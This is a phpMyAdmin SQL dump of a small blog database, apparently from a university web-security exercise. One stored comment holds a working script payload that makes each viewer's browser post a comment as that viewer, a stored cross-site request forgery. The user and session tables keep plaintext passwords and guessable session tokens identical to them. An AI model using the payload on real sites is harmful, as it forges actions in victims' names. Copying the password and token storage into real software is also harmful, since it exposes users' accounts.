-- phpMyAdmin SQL Dump
-- version 4.9.7
-- https://www.phpmyadmin.net/
--
-- Host: dd47228
-- Creato il: Dic 20, 2020 alle 14:39
-- Versione del server: 10.5.6-MariaDB-1:10.5.6+maria~focal-log
-- Versione PHP: 7.4.10

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `d034b117`
--

-- --------------------------------------------------------

--
-- Struttura della tabella `comment`
--

CREATE TABLE `comment` (
  `id` bigint(20) NOT NULL,
  `post` bigint(20) NOT NULL,
  `username` varchar(100) NOT NULL,
  `content` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `comment`
--

INSERT INTO `comment` (`id`, `post`, `username`, `content`) VALUES
(89, 40, 'tobias-b', '<script>\r\n  var xhttp = new XMLHttpRequest();\r\n  xhttp.open(\"POST\", \"/?page=post&id=39\", true);\r\n  xhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\r\n  xhttp.send(\"create_post=True&content=THIS_IS_A_COMMENT_WITH_XSRF\");\r\n</script>\r\nSome text\r\n'),
(90, 39, 'tobias-b', 'THIS_IS_A_COMMENT_WITH_XSRF'),
(91, 39, 'unibz', 'THIS_IS_A_COMMENT_WITH_XSRF'),
(92, 39, 'unibz', 'THIS_IS_A_COMMENT_WITH_XSRF');

-- --------------------------------------------------------

--
-- Struttura della tabella `post`
--

CREATE TABLE `post` (
  `id` bigint(20) NOT NULL,
  `username` varchar(100) NOT NULL,
  `title` varchar(200) NOT NULL,
  `content` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `post`
--

INSERT INTO `post` (`id`, `username`, `title`, `content`) VALUES
(39, 'tobias-b', 'Why you should be spending more on security ', '... to mitigate the risk to your business.'),
(40, 'tobias-b', 'XSRF ATTACK', '\r\n\r\n');

-- --------------------------------------------------------

--
-- Struttura della tabella `user`
--

CREATE TABLE `user` (
  `username` varchar(100) NOT NULL,
  `password` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `user`
--

INSERT INTO `user` (`username`, `password`) VALUES
('manuelkpppkkp', ''),
('newaccount', ''),
('tobias-b', 'newpassword'),
('tobias-brighe', 'tobias-brighe'),
('unibz', 'unibz'),
('unibz-user', 'unibz-user');

-- --------------------------------------------------------

--
-- Struttura della tabella `user_cookie_session`
--

CREATE TABLE `user_cookie_session` (
  `username` varchar(100) NOT NULL,
  `cookie_token` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `user_cookie_session`
--

INSERT INTO `user_cookie_session` (`username`, `cookie_token`, `created_at`) VALUES
('matthias-gallo', 'gallo123', '2020-12-18 20:27:08'),
('tobias-b', 'tobias-b', '2020-12-18 20:33:33'),
('tobias-brighe', 'tobias-brighe', '2020-12-19 08:38:24'),
('unibz-user', 'unibz-user', '2020-12-19 09:05:44'),
('tobias-b', 'newpassword', '2020-12-19 17:30:29'),
('unibz', 'unibz', '2020-12-19 17:34:45');

--
-- Indici per le tabelle scaricate
--

--
-- Indici per le tabelle `comment`
--
ALTER TABLE `comment`
  ADD PRIMARY KEY (`id`);

--
-- Indici per le tabelle `post`
--
ALTER TABLE `post`
  ADD PRIMARY KEY (`id`),
  ADD KEY `username` (`username`);

--
-- Indici per le tabelle `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`username`);

--
-- Indici per le tabelle `user_cookie_session`
--
ALTER TABLE `user_cookie_session`
  ADD KEY `username` (`username`);

--
-- AUTO_INCREMENT per le tabelle scaricate
--

--
-- AUTO_INCREMENT per la tabella `comment`
--
ALTER TABLE `comment`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=93;

--
-- AUTO_INCREMENT per la tabella `post`
--
ALTER TABLE `post`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=42;

--
-- Limiti per le tabelle scaricate
--

--
-- Limiti per la tabella `post`
--
ALTER TABLE `post`
  ADD CONSTRAINT `post_ibfk_1` FOREIGN KEY (`username`) REFERENCES `user` (`username`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
